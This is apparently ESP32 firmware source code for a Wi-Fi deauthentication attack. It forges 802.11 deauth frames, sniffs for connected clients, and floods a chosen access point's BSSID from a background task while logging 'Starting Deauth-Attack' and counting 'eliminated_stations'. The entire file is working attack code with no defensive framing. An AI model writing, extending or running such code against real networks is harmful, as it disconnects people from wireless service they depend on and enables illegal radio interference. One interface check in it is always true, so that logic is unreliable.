#include <WiFi.h>
#include <esp_wifi.h>
#include "deauth/types.h"
#include "deauth/deauth.h"
#include "deauth/definitions.h"
#include "wifi_MGMNT.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

/*extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}*/

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      }
      eliminated_stations++;
    }
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && 
        (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }
    }
  }

  Serial.printf("Sent %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", 
               NUM_FRAMES_PER_DEAUTH, 
               mac_header->src[0], mac_header->src[1], mac_header->src[2], 
               mac_header->src[3], mac_header->src[4], mac_header->src[5]);
}

void configure_deauth_frame(int wifi_number, uint16_t reason) {
    memset(&deauth_frame, 0, sizeof(deauth_frame)); // Clear the frame
    deauth_frame.frame_control[0] = 0xC0; // Frame Control: Type = Management (0x00), Subtype = Deauth (0x0C)
    deauth_frame.frame_control[1] = 0x00; // Second byte of Frame Control (set to 0x00)
    deauth_frame.duration[0] = 0x3A; // Low byte of duration
    deauth_frame.duration[1] = 0x01; // High byte of duration
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);  // Source BSSID
    deauth_frame.reason = reason; // Reason code
}

void start_deauth(int wifi_number, uint16_t reason) {
  eliminated_stations = 0;

  String ssid = WiFi.SSID(wifi_number);
  String bssid = WiFi.BSSIDstr(wifi_number);

  Serial.println("Starting Deauth-Attack on network " + ssid + " with BSSID " + bssid);

  // Configure the deauth frame
  configure_deauth_frame(wifi_number, reason);

  // Keep the web server running by avoiding promiscuous mode
  esp_wifi_set_promiscuous(false);
  xTaskCreatePinnedToCore(
    [](void *param) {
      while (deauth_type == DEAUTH_TYPE_SINGLE) {
        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
          if (interfaceAP || !interfaceAP); else {
            Serial.println("ERR: NO VALID INTERFACE FOR WIFI");
            break;
          }
          if(!interfaceAP) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
          else esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
        }
        vTaskDelay(pdMS_TO_TICKS(100)); // Delay between frame bursts
      }
      vTaskDelete(NULL);
    },
    "DeauthTask",
    4096,
    NULL,
    1,
    NULL,
    0 // Run on core 0
  );
}

void stop_deauth() {
  Serial.println("Stopping Deauth-Attack...");
  deauth_type = -1; // Set to an invalid type to stop the task
}